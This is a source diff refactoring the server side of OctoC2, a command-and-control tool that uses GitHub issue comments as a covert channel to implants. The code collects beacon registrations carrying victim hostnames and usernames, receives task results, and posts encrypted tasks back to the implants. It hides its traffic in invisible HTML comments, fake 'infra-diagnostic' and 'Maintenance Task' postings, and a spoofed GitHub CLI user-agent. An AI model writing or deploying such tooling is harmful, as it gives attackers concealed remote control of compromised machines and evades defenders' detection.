@@ -1,472 +1,411 @@
-/**
- * OctoC2 Server — IssuesChannel
- *
- * Polls the C2 GitHub repository for beacon comments using:
- *   GET /repos/{owner}/{repo}/issues/comments?since={lastPollTime}&per_page=100
- *
- * Recognizes three comment types:
- *   reg    — new beacon registration (first checkin with public key)
- *   ci     — routine heartbeat/checkin
- *   logs   — task result submission
- *
- * For each checkin, if the beacon has pending tasks in the TaskQueue, the
- * channel encrypts and posts a [job:...:deploy:...] comment to the beacon's
- * issue.
- *
- * Comment format parsed:
- *   [job:{epoch}:(reg|ci|logs):{seq}]
- *   ...
- *   ```text\n{base64url_payload}\n```
- *   <!-- - -->   ← beacon placeholder (sealed, no nonce)
- *
- * Crypto:
- *   Incoming (beacon → server): crypto_box_seal  → openSealBox()
- *   Outgoing (server → beacon): crypto_box       → encryptForBeacon()
- */
-
 import { Octokit } from "@octokit/rest";
-import type { BeaconRegistry, BeaconRecord } from "../BeaconRegistry.ts";
-import type { TaskQueue, QueuedTask } from "../TaskQueue.ts";
+import type { BeaconRecord, BeaconRegistry } from "../BeaconRegistry.ts";
+import type { QueuedTask, TaskQueue } from "../TaskQueue.ts";
+import { computeTaskResultDigest } from "@octoc2/shared";
 import {
-  openSealBox, encryptForBeacon,
-  base64ToBytes, bytesToBase64, bytesToString,
+  base64ToBytes,
+  bytesToString,
+  encryptForBeacon,
+  openSealBox,
 } from "../crypto/sodium.ts";
+import {
+  DurablePollState,
+  PollRunner,
+  repositoryPollScope,
+} from "../lib/PollRunner.ts";
+import { sha256Hex } from "../store/index.ts";
+import {
+  RejectedArtifactError,
+  assertAcceptedResult,
+  checkinAuthorizesTaskDelivery,
+  parseCheckinPayload,
+  parseTaskResult,
+  type SecureChannelServices,
+} from "./ChannelServices.ts";
+import {
+  claimDeliveries,
+  finishDeliveries,
+} from "./ChannelRuntime.ts";
 
-// ── Regexes (mirrors implant's IssuesTentacle.ts) ─────────────────────────────
-
-// Job marker is an HTML comment — invisible to viewers, parseable by machines
-const HEARTBEAT_RE  = /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
-// Beacon comments embed the ciphertext inside the infra-diagnostic HTML comment: <!-- infra-diagnostic:epoch:CIPHERTEXT -->
-const CIPHERTEXT_RE = /<!--\s*infra-diagnostic:[^\s:>]+:([A-Za-z0-9_\-+/=]+)\s*-->/;
-// Matches both <!-- - --> (sealed, no real nonce) and <!-- base64url_nonce -->
-// Colons in the job marker keep it outside this character class — no overlap.
-const NONCE_RE      = /<!--\s+(-|[A-Za-z0-9_-]{4,})\s+-->/;
-
-// ── Operator public key resolution ────────────────────────────────────────────
-
+const HEARTBEAT_RE =
+  /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
+const CIPHERTEXT_RE =
+  /<!--\s*infra-diagnostic:[^\s:>]+:([A-Za-z0-9_\-+/=]+)\s*-->/;
 const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
 
-/**
- * Resolve the operator X25519 public key.
- *
- * Priority order:
- *   1. GitHub Variables API  — `MONITORING_PUBKEY` repo variable
- *      (authoritative source; beacons read from here too)
- *   2. `MONITORING_PUBKEY` env var — fallback for air-gapped/offline use
- *
- * Throws if neither source yields a valid 32-byte key.
- */
 export async function resolveOperatorPublicKey(
   octokit: Octokit,
-  owner:   string,
-  repo:    string
+  owner: string,
+  repo: string,
 ): Promise<Uint8Array> {
-  // ── 1. Try GitHub Variables API ─────────────────────────────────────────────
   try {
-    const resp = await octokit.rest.actions.getRepoVariable({
-      owner, repo, name: OPERATOR_PUBKEY_VAR,
+    const response = await octokit.rest.actions.getRepoVariable({
+      owner,
+      repo,
+      name: OPERATOR_PUBKEY_VAR,
     });
-    const b64 = resp.data.value?.trim();
-    if (b64 && b64.length > 0) {
-      const key = await base64ToBytes(b64);
-      if (key.length === 32) {
-        console.log(`[IssuesChannel] Operator public key loaded from GitHub Variable`);
-        return key;
-      }
-      console.warn(`[IssuesChannel] GitHub Variable '${OPERATOR_PUBKEY_VAR}' decoded to ${key.length} bytes (expected 32) — trying env fallback`);
+    const encoded = response.data.value?.trim();
+    if (encoded) {
+      const key = await base64ToBytes(encoded);
+      if (key.length === 32) return key;
     }
-  } catch (err) {
+  } catch (error) {
     console.warn(
-      `[IssuesChannel] Could not fetch '${OPERATOR_PUBKEY_VAR}' from GitHub Variables:`,
-      (err as Error).message,
-      "— trying env fallback"
+      `[IssuesChannel] Could not fetch '${OPERATOR_PUBKEY_VAR}':`,
+      (error as Error).message,
     );
   }
 
-  // ── 2. Fall back to env var ──────────────────────────────────────────────────
-  const envB64 = process.env[OPERATOR_PUBKEY_VAR]?.trim();
-  if (envB64 && envB64.length > 0) {
-    const key = await base64ToBytes(envB64);
-    if (key.length === 32) {
-      console.log(`[IssuesChannel] Operator public key loaded from env var`);
-      return key;
-    }
+  const encoded = process.env[OPERATOR_PUBKEY_VAR]?.trim();
+  if (encoded) {
+    const key = await base64ToBytes(encoded);
+    if (key.length === 32) return key;
   }
-
   throw new Error(
-    `[IssuesChannel] Operator public key not found. ` +
-    `Set the '${OPERATOR_PUBKEY_VAR}' GitHub repo variable (preferred) ` +
-    `or the '${OPERATOR_PUBKEY_VAR}' environment variable.`
+    `[IssuesChannel] Set the '${OPERATOR_PUBKEY_VAR}' repository variable or environment variable`,
   );
 }
 
-// ── Config ────────────────────────────────────────────────────────────────────
-
 export interface IssuesChannelConfig {
-  owner:            string;
-  repo:             string;
-  token:            string;
-  /** X25519 operator public key (Uint8Array) — used to decrypt sealed messages */
-  operatorPublicKey:  Uint8Array;
-  /** X25519 operator secret key (Uint8Array) — used to encrypt task deliveries */
-  operatorSecretKey:  Uint8Array;
-  /** Polling interval in ms (default: 30 000) */
+  owner: string;
+  repo: string;
+  token: string;
+  operatorPublicKey: Uint8Array;
+  operatorSecretKey: Uint8Array;
   pollIntervalMs?: number;
-  /**
-   * Pre-built Octokit instance. When provided, `token` is still stored but
-   * the provided instance is used for all API calls. Useful when the caller
-   * already created an Octokit (e.g., for key resolution) and wants to reuse it.
-   */
   octokit?: Octokit;
 }
 
-// ── Parsed beacon comment ────────────────────────────────────────────────────
-
 interface ParsedBeaconComment {
-  commentId:  number;
+  commentId: number;
+  messageId: string;
   issueNumber: number;
-  type:       "reg" | "ci" | "logs";
-  seq:        number;
+  type: "reg" | "ci" | "logs";
   ciphertext: string;
+  /** Relay ingress is distinguishable from a direct control-repo comment. */
+  transport?: "issues" | "proxy";
 }
 
-// ── IssuesChannel ─────────────────────────────────────────────────────────────
+interface DispatchOutcome {
+  outcome: "accepted" | "duplicate" | "rejected";
+  beaconId?: string;
+  taskId?: string;
+}
 
 export class IssuesChannel {
-  private readonly octokit:   Octokit;
-  private readonly registry:  BeaconRegistry;
-  private readonly taskQueue: TaskQueue;
-  private readonly config:    Omit<Required<IssuesChannelConfig>, "octokit">;
-
-  /** ISO-8601 timestamp of the last successful poll. Updated after each round. */
-  private lastPollTime: string;
-
-  private pollTimer: ReturnType<typeof setInterval> | null = null;
+  private readonly octokit: Octokit;
+  private readonly config: Omit<Required<IssuesChannelConfig>, "octokit">;
+  private readonly initialPollTime = new Date(Date.now() - 5_000).toISOString();
+  private readonly progress: DurablePollState;
+  private readonly runner: PollRunner;
 
   constructor(
-    registry:  BeaconRegistry,
-    taskQueue: TaskQueue,
-    config:    IssuesChannelConfig,
+    private readonly registry: BeaconRegistry,
+    private readonly taskQueue: TaskQueue,
+    config: IssuesChannelConfig,
+    private readonly services: SecureChannelServices,
   ) {
-    this.registry  = registry;
-    this.taskQueue = taskQueue;
-    this.config    = {
-      pollIntervalMs: 30_000,
-      ...config,
-    };
-
+    this.config = { pollIntervalMs: 30_000, ...config };
     this.octokit = config.octokit ?? new Octokit({
-      auth:    config.token,
-      // Blend into normal git traffic
-      headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
+      auth: config.token,
+      headers: {
+        "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
+      },
     });
-
-    // Start polling 5 seconds in the past to catch comments made just before startup
-    this.lastPollTime = new Date(Date.now() - 5_000).toISOString();
+    this.progress = new DurablePollState(
+      services.store,
+      "issues-poll",
+      repositoryPollScope(config.owner, config.repo),
+      5_000,
+    );
+    this.runner = new PollRunner({
+      name: "IssuesChannel",
+      intervalMs: this.config.pollIntervalMs,
+      poll: () => this.poll(),
+      onError: (error) => {
+        console.warn(
+          "[IssuesChannel] Poll error:",
+          error instanceof Error ? error.message : String(error),
+        );
+      },
+    });
   }
 
-  // ── Lifecycle ─────────────────────────────────────────────────────────────────
-
-  /** Begin periodic polling. Call once at server startup. */
   start(): void {
-    if (this.pollTimer) return;
-
+    this.runner.start();
     console.log(
-      `[IssuesChannel] Starting poll loop (interval: ${this.config.pollIntervalMs}ms)`
-    );
-
-    this.pollTimer = setInterval(() => {
-      this.poll().catch((err) =>
-        console.warn("[IssuesChannel] Poll error:", (err as Error).message)
-      );
-    }, this.config.pollIntervalMs);
-
-    // Run once immediately
-    this.poll().catch((err) =>
-      console.warn("[IssuesChannel] Initial poll error:", (err as Error).message)
+      `[IssuesChannel] Starting poll loop (interval: ${this.config.pollIntervalMs}ms)`,
     );
   }
 
-  /** Stop polling. Call on graceful shutdown. */
-  stop(): void {
-    if (this.pollTimer) {
-      clearInterval(this.pollTimer);
-      this.pollTimer = null;
-    }
+  async stop(): Promise<void> {
+    await this.runner.stop();
   }
-
-  // ── Main poll cycle ───────────────────────────────────────────────────────────
 
   async poll(): Promise<void> {
-    const since    = this.lastPollTime;
-    const polledAt = new Date().toISOString();
-
+    const since = this.progress.timestampSince(this.initialPollTime);
     const comments = await this.octokit.paginate(
       this.octokit.rest.issues.listCommentsForRepo,
       {
-        owner:    this.config.owner,
-        repo:     this.config.repo,
+        owner: this.config.owner,
+        repo: this.config.repo,
         since,
         per_page: 100,
-        sort:     "created",
+        sort: "created",
         direction: "asc",
-      }
+      },
     );
-
-    if (comments.length > 0) {
-      console.log(`[IssuesChannel] Processing ${comments.length} new comment(s) since ${since}`);
-    }
+    comments.sort((left, right) =>
+      commentTimestamp(left).localeCompare(commentTimestamp(right)) ||
+      left.id - right.id
+    );
 
     for (const comment of comments) {
-      // Only consider comments on issues (not pull requests)
-      if (!comment.issue_url) continue;
-
-      const issueNumber = extractIssueNumber(comment.issue_url);
-      if (issueNumber === null) continue;
-
-      const parsed = parseBeaconComment(comment.body ?? "", comment.id, issueNumber);
-      if (!parsed) {
-        const snippet = (comment.body ?? "").slice(0, 80).replace(/\n/g, " ");
-        console.debug(`[IssuesChannel] Comment #${comment.id} on issue #${issueNumber} did not parse — skipping. Body: ${snippet}`);
-        continue;
-      }
-
-      await this.dispatch(parsed);
-    }
-
-    // Proactive task delivery: push pending tasks to any beacon in maintenance mode.
-    // Beacons running in maintenance-only mode (initialMaintenancePosted=true) skip
-    // normal CI heartbeat comments, so onCheckin() is never triggered. This pass
-    // ensures tasks queued after the first maintenance comment are still delivered.
-    for (const beacon of this.registry.getAll()) {
-      if (beacon.issueNumber == null || beacon.issueNumber === 0) continue;
-      const pending = this.taskQueue.getPendingTasks(beacon.beaconId)
-        .filter(t => !t.preferredChannel || t.preferredChannel === "issues");
-      if (pending.length > 0) {
-        console.log(
-          `[IssuesChannel] Proactive delivery: ${pending.length} task(s) to beacon ${beacon.beaconId}`
+      const body = comment.body ?? "";
+      const cursor = commentTimestamp(comment);
+      const version = (comment as { updated_at?: string }).updated_at ??
+        (comment as { created_at?: string }).created_at ??
+        sha256Hex(body);
+      const messageId =
+        `comment:${comment.id}:${version}:${sha256Hex(body)}`;
+      await this.progress.process({
+        messageId,
+        payload: body,
+        cursor,
+      }, async () => {
+        if (!comment.issue_url) return { outcome: "rejected" };
+        const issueNumber = extractIssueNumber(comment.issue_url);
+        if (issueNumber === null) return { outcome: "rejected" };
+        const parsed = parseBeaconComment(
+          body,
+          comment.id,
+          messageId,
+          issueNumber,
         );
-        await this.deliverTasks(beacon.issueNumber, beacon, pending);
-      }
+        if (!parsed) return { outcome: "rejected" };
+        return this.dispatch(parsed);
+      });
     }
-
-    this.lastPollTime = polledAt;
   }
 
-  // ── Dispatch ──────────────────────────────────────────────────────────────────
-
-  private async dispatch(comment: ParsedBeaconComment): Promise<void> {
+  private async dispatch(
+    comment: ParsedBeaconComment,
+  ): Promise<DispatchOutcome> {
     try {
       switch (comment.type) {
-        case "reg":  await this.onRegistration(comment); break;
-        case "ci":   await this.onCheckin(comment);      break;
-        case "logs": await this.onResult(comment);       break;
+        case "reg":
+          return await this.onRegistration(comment);
+        case "ci":
+          return await this.onCheckin(comment);
+        case "logs":
+          return await this.onResult(comment);
       }
-    } catch (err) {
+    } catch (error) {
       console.warn(
-        `[IssuesChannel] Failed to process ${comment.type} comment #${comment.commentId}:`,
-        (err as Error).message
+        `[IssuesChannel] Failed to process ${comment.type} ${comment.messageId}:`,
+        (error as Error).message,
       );
+      if (error instanceof RejectedArtifactError) {
+        return { outcome: "rejected" };
+      }
+      throw error;
     }
   }
 
-  // ── Handlers ──────────────────────────────────────────────────────────────────
+  private async onRegistration(
+    comment: ParsedBeaconComment,
+  ): Promise<DispatchOutcome> {
+    const transport = comment.transport ?? "issues";
+    const payload = await this.parseSealedArtifact(
+      comment,
+      parseCheckinPayload,
+    );
+    const beaconPublicKey = await this.parseBeaconPublicKey(payload.publicKey);
+    const status = await this.services.identities.verifyAndRegisterCheckin(
+      payload,
+      payload.beaconId,
+      transport === "proxy" ? 10 : 1,
+      comment.issueNumber,
+    );
 
-  /**
-   * Process a [job:...:reg:...] comment.
-   * Decrypts the sealed payload, registers the beacon, posts an encrypted ACK
-   * containing an empty task array [] so the beacon's pollForDeployComments
-   * terminates cleanly without needing special-case logic.
-   */
-  private async onRegistration(comment: ParsedBeaconComment): Promise<void> {
-    const plaintext = await this.openSeal(comment.ciphertext);
-    const payload   = JSON.parse(bytesToString(plaintext)) as {
-      beaconId:     string;
-      publicKey:    string;
-      hostname:     string;
-      username:     string;
-      os:           string;
-      arch:         string;
-      registeredAt: string;
-    };
-
-    // Validate seq (replay protection)
-    const seqResult = this.registry.advanceSeq(payload.beaconId, comment.seq);
-    if (seqResult === "replay") {
-      console.warn(`[IssuesChannel] Replay seq ${comment.seq} from ${payload.beaconId} — ignored`);
-      return;
-    }
-    if (seqResult === "gap") {
-      console.warn(`[IssuesChannel] Seq gap for ${payload.beaconId} (seq=${comment.seq})`);
-    }
-
-    // Register (or re-register) the beacon
-    this.registry.register({
-      beaconId:    payload.beaconId,
-      issueNumber: comment.issueNumber,
-      publicKey:   payload.publicKey,
-      hostname:    payload.hostname,
-      username:    payload.username,
-      os:          payload.os,
-      arch:        payload.arch,
-      seq:         comment.seq,
-      tentacleId:  1,
-    });
-
-    // Post ACK: encrypt an empty task array to the beacon's public key.
-    // The beacon decrypts it, gets [], and advances lastTaskCommentId — no
-    // special-case handling needed on either side.
-    const beaconPublicKey = await base64ToBytes(payload.publicKey);
-    const { nonce, ciphertext } = await encryptForBeacon(
-      JSON.stringify([]),
+    const encrypted = await encryptForBeacon(
+      JSON.stringify({
+        kind: "registration-ack",
+        beaconId: payload.beaconId,
+        registrationId: String(comment.commentId),
+        ...(payload.identity && {
+          registrationSequence: payload.identity.sequence,
+        }),
+        acceptedAt: new Date().toISOString(),
+      }),
       beaconPublicKey,
-      this.config.operatorSecretKey
+      this.config.operatorSecretKey,
     );
-    await this.postDeployComment(comment.issueNumber, payload.beaconId, "reg-ack", [], nonce, ciphertext);
-  }
-
-  /**
-   * Process a [job:...:ci:...] heartbeat.
-   * Updates lastSeen, delivers any pending tasks.
-   */
-  private async onCheckin(comment: ParsedBeaconComment): Promise<void> {
-    const plaintext = await this.openSeal(comment.ciphertext);
-    const payload   = JSON.parse(bytesToString(plaintext)) as { beaconId: string };
-
-    const beacon = this.registry.getByIssue(comment.issueNumber);
-    if (!beacon) {
-      console.warn(
-        `[IssuesChannel] ci comment on issue #${comment.issueNumber} but no beacon in registry — ` +
-        "beacon may need to re-register."
-      );
-      return;
-    }
-
-    // Replay protection
-    const seqResult = this.registry.advanceSeq(beacon.beaconId, comment.seq);
-    if (seqResult === "replay") {
-      console.warn(`[IssuesChannel] Replay seq ${comment.seq} from ${beacon.beaconId} — ignored`);
-      return;
-    }
-
-    this.registry.updateLastSeen(beacon.beaconId, comment.seq);
-    this.registry.updateActiveTentacle(beacon.beaconId, 1);
-    void payload; // checkin payload parsed for future use (sysinfo, etc.)
-
-    // Deliver any pending tasks that have no preferredChannel or prefer "issues"
-    const allPending = this.taskQueue.getPendingTasks(beacon.beaconId);
-    const pending = allPending.filter(
-      t => !t.preferredChannel || t.preferredChannel === "issues"
+    await this.postDeployComment(
+      comment.issueNumber,
+      payload.beaconId,
+      "reg-ack",
+      encrypted.nonce,
+      encrypted.ciphertext,
     );
-    if (pending.length > 0) {
-      console.log(
-        `[IssuesChannel] Delivering ${pending.length} task(s) to beacon ${beacon.beaconId}`
-      );
-      await this.deliverTasks(comment.issueNumber, beacon, pending);
-    }
-  }
-
-  /**
-   * Process a [job:...:logs:...] result comment.
-   * Decrypts and stores the task result.
-   */
-  private async onResult(comment: ParsedBeaconComment): Promise<void> {
-    const plaintext = await this.openSeal(comment.ciphertext);
-    const result    = JSON.parse(bytesToString(plaintext)) as {
-      taskId:      string;
-      beaconId:    string;
-      completedAt: string;
-      output?:     string;
-      error?:      string;
+    return {
+      outcome: checkinAuthorizesTaskDelivery(status)
+        ? "accepted"
+        : "duplicate",
+      beaconId: payload.beaconId,
     };
-
-    const beacon = this.registry.getByIssue(comment.issueNumber);
-    if (!beacon) {
-      console.warn(`[IssuesChannel] Result from unknown issue #${comment.issueNumber}`);
-      return;
-    }
-
-    // Replay protection
-    const seqResult = this.registry.advanceSeq(beacon.beaconId, comment.seq);
-    if (seqResult === "replay") {
-      console.warn(`[IssuesChannel] Replay seq ${comment.seq} on result — ignored`);
-      return;
-    }
-
-    this.registry.updateLastSeen(beacon.beaconId, comment.seq);
-
-    const resultPayload = result.output ?? result.error ?? "(no output)";
-    const completed = this.taskQueue.markCompleted(result.taskId, resultPayload);
-
-    if (completed) {
-      console.log(
-        `[IssuesChannel] Task ${result.taskId} result received from ${beacon.beaconId}`
-      );
-    } else {
-      console.warn(
-        `[IssuesChannel] Result for unknown/already-closed task ${result.taskId}`
-      );
-    }
   }
 
-  // ── Task delivery ──────────────────────────────────────────────────────────────
+  private async onCheckin(
+    comment: ParsedBeaconComment,
+  ): Promise<DispatchOutcome> {
+    const transport = comment.transport ?? "issues";
+    const payload = await this.parseSealedArtifact(
+      comment,
+      parseCheckinPayload,
+    );
+    const beacon = this.registry.getByIssue(comment.issueNumber);
+    if (!beacon || beacon.beaconId !== payload.beaconId) {
+      throw new RejectedArtifactError(
+        "signed checkin does not own this issue",
+      );
+    }
+    const status = await this.services.identities.verifyAndRegisterCheckin(
+      payload,
+      beacon.beaconId,
+      transport === "proxy" ? 10 : 1,
+      comment.issueNumber,
+    );
 
-  /**
-   * Encrypt all pending tasks together and post a single deploy comment.
-   * All tasks are bundled into one JSON array and encrypted to the beacon's
-   * X25519 public key, authenticated by the operator's secret key.
-   */
+    if (checkinAuthorizesTaskDelivery(status)) {
+      const pending = this.taskQueue.getDeliverableTasks(
+        beacon.beaconId,
+        transport,
+      );
+      if (pending.length > 0) {
+        await this.deliverTasks(
+          comment.issueNumber,
+          beacon,
+          pending,
+          transport,
+        );
+      }
+    }
+    return {
+      outcome: checkinAuthorizesTaskDelivery(status)
+        ? "accepted"
+        : "duplicate",
+      beaconId: beacon.beaconId,
+    };
+  }
+
+  private async onResult(
+    comment: ParsedBeaconComment,
+  ): Promise<DispatchOutcome> {
+    const transport = comment.transport ?? "issues";
+    const result = await this.parseSealedArtifact(
+      comment,
+      parseTaskResult,
+    );
+    const beacon = this.registry.getByIssue(comment.issueNumber);
+    if (!beacon || beacon.beaconId !== result.beaconId) {
+      throw new RejectedArtifactError(
+        "signed result does not own this issue",
+      );
+    }
+    const outcome = assertAcceptedResult(
+      await this.services.tasks.acceptSignedResult(
+        result,
+        beacon.beaconId,
+        {
+          channel: transport,
+          messageId: comment.messageId,
+          payloadDigest: sha256Hex(comment.ciphertext),
+        },
+      ),
+    );
+    const acceptedAt = new Date().toISOString();
+    const encrypted = await encryptForBeacon(
+      JSON.stringify({
+        kind: "result-acceptance",
+        beaconId: beacon.beaconId,
+        taskId: result.taskId,
+        resultDigest: await computeTaskResultDigest(result),
+        acceptedAt,
+      }),
+      await base64ToBytes(beacon.publicKey),
+      this.config.operatorSecretKey,
+    );
+    await this.postDeployComment(
+      comment.issueNumber,
+      beacon.beaconId,
+      `result-ack-${result.taskId}`,
+      encrypted.nonce,
+      encrypted.ciphertext,
+    );
+    return {
+      outcome,
+      beaconId: beacon.beaconId,
+      taskId: result.taskId,
+    };
+  }
+
   private async deliverTasks(
     issueNumber: number,
     beacon: BeaconRecord,
-    tasks: QueuedTask[]
+    tasks: QueuedTask[],
+    transport: "issues" | "proxy" = "issues",
   ): Promise<void> {
-    const beaconPublicKey = await base64ToBytes(beacon.publicKey);
-
-    // Serialize the task array (strip internal fields the beacon doesn't need)
-    const taskArray = tasks.map(t => ({
-      taskId: t.taskId,
-      kind:   t.kind,
-      args:   t.args,
-      ref:    t.ref,
-    }));
-
-    const { nonce, ciphertext } = await encryptForBeacon(
-      JSON.stringify(taskArray),
-      beaconPublicKey,
-      this.config.operatorSecretKey
+    const deliveries = claimDeliveries(
+      this.services,
+      transport,
+      beacon.beaconId,
+      tasks,
+      Math.max(this.config.pollIntervalMs * 2, 60_000),
     );
-
-    // Use the first task's ref as the comment ref (most common case: one task)
-    const ref = tasks[0]?.ref ?? "batch";
-
-    await this.postDeployComment(issueNumber, beacon.beaconId, ref, tasks, nonce, ciphertext);
-
-    // Mark all delivered tasks
-    for (const task of tasks) {
-      this.taskQueue.markDelivered(task.taskId);
+    if (deliveries.length === 0) return;
+    try {
+      const encrypted = await encryptForBeacon(
+        JSON.stringify(deliveries.map(({ task }) => ({
+          taskId: task.taskId,
+          kind: task.kind,
+          args: task.args,
+          ref: task.ref,
+        }))),
+        await base64ToBytes(beacon.publicKey),
+        this.config.operatorSecretKey,
+      );
+      await this.postDeployComment(
+        issueNumber,
+        beacon.beaconId,
+        deliveries[0]?.task.ref ?? "batch",
+        encrypted.nonce,
+        encrypted.ciphertext,
+      );
+      finishDeliveries(this.services, deliveries, "delivered");
+    } catch (error) {
+      finishDeliveries(
+        this.services,
+        deliveries,
+        "transient_failure",
+        error,
+      );
+      throw error;
     }
   }
 
-  /**
-   * Post a [job:...:deploy:...] comment to the beacon's issue.
-   * Both `nonce` and `ciphertext` are required — callers must always encrypt.
-   */
   private async postDeployComment(
     issueNumber: number,
-    beaconId:    string,
-    ref:         string,
-    _tasks:      QueuedTask[],
-    nonce:       string,
-    ciphertext:  string
+    beaconId: string,
+    ref: string,
+    nonce: string,
+    ciphertext: string,
   ): Promise<void> {
     const epoch = Math.floor(Date.now() / 1000);
-
     const body = [
-      // Invisible to viewers; parsed by the beacon's pollForDeployComments
       `<!-- job:${epoch}:deploy:${ref} -->`,
       "",
-      `### 📌 Maintenance Task · Ref \`${ref}\``,
+      `### Maintenance Task · Ref \`${ref}\``,
       "",
       "Automated maintenance task queued for execution.",
       "",
@@ -480,59 +419,94 @@ export class IssuesChannel {
       "</details>",
       `<!-- ${nonce} -->`,
     ].join("\n");
-
     await this.octokit.rest.issues.createComment({
-      owner:        this.config.owner,
-      repo:         this.config.repo,
+      owner: this.config.owner,
+      repo: this.config.repo,
       issue_number: issueNumber,
       body,
     });
-
     console.log(
-      `[IssuesChannel] Posted deploy comment (ref=${ref}) on issue #${issueNumber} for ${beaconId}`
+      `[IssuesChannel] Posted deploy comment (ref=${ref}) on issue #${issueNumber} for ${beaconId}`,
     );
   }
 
-  // ── Crypto helpers ─────────────────────────────────────────────────────────────
+  private async openSeal(ciphertext: string): Promise<Uint8Array> {
+    return openSealBox(
+      ciphertext,
+      this.config.operatorPublicKey,
+      this.config.operatorSecretKey,
+    );
+  }
 
-  private async openSeal(ciphertextB64: string): Promise<Uint8Array> {
-    return openSealBox(ciphertextB64, this.config.operatorPublicKey, this.config.operatorSecretKey);
+  private async parseSealedArtifact<T>(
+    comment: ParsedBeaconComment,
+    parse: (serialized: string) => T,
+  ): Promise<T> {
+    try {
+      return parse(bytesToString(await this.openSeal(comment.ciphertext)));
+    } catch (error) {
+      if (error instanceof RejectedArtifactError) throw error;
+      throw new RejectedArtifactError(
+        `malformed ${comment.type} artifact: ${errorMessage(error)}`,
+      );
+    }
+  }
+
+  private async parseBeaconPublicKey(encoded: string): Promise<Uint8Array> {
+    try {
+      const key = await base64ToBytes(encoded);
+      if (key.length !== 32) {
+        throw new Error("public key must contain 32 bytes");
+      }
+      return key;
+    } catch (error) {
+      throw new RejectedArtifactError(
+        `invalid beacon encryption key: ${errorMessage(error)}`,
+      );
+    }
   }
 }
 
-// ── Module-level helpers ───────────────────────────────────────────────────────
-
-/** Extract the issue number from a GitHub issue_url like .../issues/42 */
 function extractIssueNumber(url: string): number | null {
-  const m = /\/issues\/(\d+)$/.exec(url);
-  return m ? parseInt(m[1]!, 10) : null;
+  const match = /\/issues\/(\d+)$/.exec(url);
+  return match ? Number.parseInt(match[1]!, 10) : null;
 }
 
-/** Parse a raw comment body into a typed beacon comment, or null if unrecognized. */
 function parseBeaconComment(
-  body:        string,
-  commentId:   number,
-  issueNumber: number
+  body: string,
+  commentId: number,
+  messageId: string,
+  issueNumber: number,
 ): ParsedBeaconComment | null {
-  const hb = HEARTBEAT_RE.exec(body);
-  if (!hb) return null;
-
-  const type = hb[2] as "reg" | "ci" | "logs" | "deploy";
-  // Skip server-posted deploy comments (avoid processing our own output)
-  if (type === "deploy") return null;
-
-  const ct = CIPHERTEXT_RE.exec(body);
-  if (!ct) return null;
-
-  const seq = parseInt(hb[3]!, 10);
-  if (isNaN(seq)) return null;
-
+  const marker = HEARTBEAT_RE.exec(body);
+  if (!marker || marker[2] === "deploy") return null;
+  const encrypted = CIPHERTEXT_RE.exec(body);
+  if (!encrypted) return null;
   return {
     commentId,
+    messageId,
     issueNumber,
-    type:       type as "reg" | "ci" | "logs",
-    seq,
-    ciphertext: ct[1]!.trim(),
+    type: marker[2] as "reg" | "ci" | "logs",
+    ciphertext: encrypted[1]!.trim(),
+    transport: body.includes("<!-- octoc2-relay:ingress:")
+      ? "proxy"
+      : "issues",
   };
 }
 
+function commentTimestamp(comment: {
+  created_at?: string | null;
+  updated_at?: string | null;
+}): string {
+  const candidate = comment.updated_at ?? comment.created_at;
+  const timestamp = typeof candidate === "string"
+    ? new Date(candidate).getTime()
+    : Number.NaN;
+  return Number.isFinite(timestamp)
+    ? new Date(timestamp).toISOString()
+    : new Date().toISOString();
+}
+
+function errorMessage(error: unknown): string {
+  return error instanceof Error ? error.message : String(error);
+}
